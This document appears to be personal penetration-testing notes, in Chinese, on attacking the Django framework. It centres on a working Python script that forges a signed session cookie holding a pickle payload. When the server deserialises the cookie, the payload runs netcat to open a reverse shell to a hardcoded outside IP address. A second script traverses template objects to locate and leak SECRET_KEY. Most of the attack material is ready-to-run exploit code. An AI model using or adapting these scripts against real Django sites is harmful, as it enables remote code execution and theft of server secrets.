# django



这里记录着我对渗透django框架的总结



## 官方文档地址

官方文档 https://docs.djangoproject.com/zh-hans/3.0/ 



## django结构

```
|-site
|	|- __init__.py
|	|- settings.py
|	|- urls.py
|	|- wsgi.py
|
|
|-manage.py
```

settings里面是配置

urls是路由



## django ssti

django ssti严格限制了不能以属性和变量不能以下划线开头,这大大削弱了ssti的危害性,但是可以通过读取django的配置来方便进一步利用

### 特殊的session配置与secret_key泄露导致的命令执行

当django有如下配置时

```
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
SESSION_SERIALIZER = 'core.serializer.PickleSerializer'
```



加上泄露secret_key 导致任意命令执行

 https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions 



#### 生成恶意cookie的脚本



```python
import base64
import datetime
import json
import re
import time
import zlib
import pickle
from django.utils import baseconv
from django.utils.crypto import constant_time_compare, salted_hmac
from django.utils.encoding import force_bytes
from django.utils.module_loading import import_string
from django import core
from django.core import signing


myexp=b'''cbuiltins
globals
(tRp100
cbuiltins
getattr
p101
(g100
S'get'
tR(S'builtins'
tRp103
g101
(g103
S'eval'
tR(S'eval(\'\'\'__import__('os').system('nc -e "cmd.exe /K" 39.108.164.219 60000 -d')\'\'\')'
tR.'''
def pickle_exp(SECRET_KEY):
    data = myexp
    compress=True
    # Flag for if it's been compressed or not
    is_compressed = False
    salt='django.contrib.sessions.backends.signed_cookies'
    if compress:
        # Avoid zlib dependency unless compress is being used
        compressed = zlib.compress(data)
        if len(compressed) < (len(data) - 1):
            data = compressed
            is_compressed = True
    base64d = signing.b64_encode(data).decode()
    if is_compressed:
        base64d = '.' + base64d
    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))


pickle_exp("asdasdasdasdas")

```



### 泄露secret_key脚本



```python 
from django.http.response import HttpResponse, HttpResponseRedirect
from django.template import engines
from django.contrib.auth import login as auth_login, get_user_model, authenticate
from django.contrib.auth.views import LoginView, logout_then_login
from django.contrib.auth.decorators import login_required
from django.views import generic
from django import template

import django
from django import template
register = template.Library()

@register.filter
def get_dict(obj,way="",depth=0):
    if depth>11:
        return 
    objdir=dir(obj)
    r={"dict":objdir,"way":way}
    result=""
    
    for i in objdir:            
        try :
            if '_' == i[0]:
                continue
            if getattr(obj, '__module__', None)!=None and getattr(obj, '__module__', None).split('.')[0] == django.__name__:
                result+=get_dict(getattr(obj,i,None),way+"."+i,depth+1) 
        except TypeError:
            pass

    if "SECRET_KEY" in objdir or "settings" in objdir:
        print(way)
        return result+way+"\n"
    return result
```



## 关于调试django的一些建议



如果要看某个功能的具体实现,一定结合文档和源代码,不然你会绝望的.



